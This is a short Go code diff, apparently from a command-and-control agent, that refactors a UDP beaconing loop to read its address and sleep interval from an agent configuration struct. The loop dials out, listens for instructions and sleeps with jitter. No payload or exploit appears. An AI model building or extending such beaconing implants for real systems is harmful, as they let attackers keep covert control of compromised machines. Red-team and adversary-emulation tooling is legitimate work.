@@ -19,15 +19,15 @@ func init() {
 	CommunicationChannels["udp"] = UDP{}
 }
 
-func (contact UDP) Communicate(address string, sleep int, beacon Beacon) {
+func (contact UDP) Communicate(agent util.AgentConfig, beacon Beacon) {
 	for {
-		conn, err := net.Dial("udp", address)
+		conn, err := net.Dial("udp", agent.Address)
 	   	if err != nil {
-	   		log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", address)
+	   		log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Address)
 	   	} else {
 	   		udpListen(conn, beacon)
 	   	}
-	   	jitterSleep(sleep, "UDP")
+	   	jitterSleep(agent.Sleep, "UDP")
 	}
 }
 
